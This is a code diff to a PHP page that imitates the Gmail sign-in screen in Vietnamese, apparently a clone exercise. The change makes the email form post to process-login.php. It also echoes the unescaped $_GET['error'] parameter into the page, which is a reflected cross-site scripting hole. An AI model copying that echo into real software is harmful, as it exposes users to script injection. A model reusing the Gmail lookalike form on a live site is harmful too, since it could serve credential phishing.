@@ -12,7 +12,7 @@
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
     integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
     crossorigin="anonymous"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
+ 
 </head>
 
 <body>
@@ -21,10 +21,18 @@
     <h4>Đăng nhập</h4>
     <p style="margin-bottom: 8%;">để tiếp tục đến Gmail</p>
 
-    <form>
+    <form class="form-signin" action="process-login.php" method="post">
 
-      <input type="email" name="email" id="email" placeholder="Email hoặc số điện thoại" required>
+      <input type="email" name="txtEmail" id="email" placeholder="Email hoặc số điện thoại" required>
+      <p class="invalid-feedback">
+                Please provide a valid zip.
+            </p><br>
+            <?php
+                    if(isset($_GET['error'])){
+                        echo "<p style='color:red;font-size:13px;margin:5px 33px;text-align:left;'><svg aria-hidden='true' fill='currentColor' focusable='false' width='16px' height='16px' viewBox='0 0 24 24' xmlns='https://www.w3.org/2000/svg'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'></path></svg> {$_GET['error']} </p>";
+                    }
 
+                ?>
       <div class="col-md-6">
         <a style="text-decoration: none" href="Forget.php">Bạn quên địa chỉ email</a>
       </div>
@@ -37,7 +45,8 @@
           <a style="text-decoration: none" href="#">Tạo tài khoản</a>
         </div>
         <div class="d-grid  col-4 mx-auto">
-         <a href="LoginPassWord.php"> <button type="button" class="btn btn-primary" style="width:100%">Tiếp theo</button></a>
+        <button type="submit" class="btn btn-primary" name="btnSignIn">Tiếp theo</button>
+         <!-- <a href="LoginPassWord.php"> <button type="button" class="btn btn-primary" style="width:100%">Tiếp theo</button></a> -->
         </div>
       </div>
     </form>
